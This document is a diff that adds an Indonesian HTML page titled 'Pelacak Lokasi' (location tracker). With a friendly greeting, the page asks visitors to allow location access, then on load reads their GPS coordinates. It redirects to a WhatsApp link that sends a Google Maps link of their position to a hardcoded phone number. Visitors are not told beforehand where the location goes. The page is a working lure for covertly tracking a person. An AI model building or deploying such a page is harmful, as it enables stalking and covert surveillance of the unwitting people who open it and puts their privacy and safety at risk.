@@ -1,0 +1,55 @@
+<!DOCTYPE html><html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pelacak Lokasi</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 2rem;
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <h2>Halo! Izinkan lokasi kamu ya</h2>
+  <p>Klik "Izinkan" saat diminta untuk memberikan lokasi kamu.</p>  <div id="status"></div>  <script>
+    function sendToWhatsApp(latitude, longitude, timestamp) {
+      const lokasiLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const waktu = new Date(timestamp).toLocaleString('id-ID');
+      const pesan = `Hai! Lokasi telah didapatkan!%0A%0ALokasi: ${lokasiLink}%0AWaktu: ${waktu}`;
+      const whatsappURL = `https://api.whatsapp.com/send?phone=6283802358171&text=${pesan}`;
+      window.location.href = whatsappURL;
+    }
+
+    function getLocation() {
+      const status = document.getElementById('status');
+      if (!navigator.geolocation) {
+        status.innerText = 'Geolocation tidak didukung browser ini.';
+        return;
+      }
+
+      status.innerText = 'Mengambil lokasi...';
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          const timestamp = position.timestamp;
+
+          // Simpan data ke LocalStorage (jika ingin disimpan di sisi klien)
+          const data = { latitude, longitude, timestamp };
+          localStorage.setItem('lokasiData', JSON.stringify(data));
+
+          status.innerText = 'Lokasi berhasil didapatkan! Mengirim ke WhatsApp...';
+          sendToWhatsApp(latitude, longitude, timestamp);
+        },
+        (error) => {
+          status.innerText = 'Gagal mengambil lokasi: ' + error.message;
+        }
+      );
+    }
+
+    // Jalankan saat halaman dibuka
+    window.onload = getLocation;
+  </script></body>
+</html>
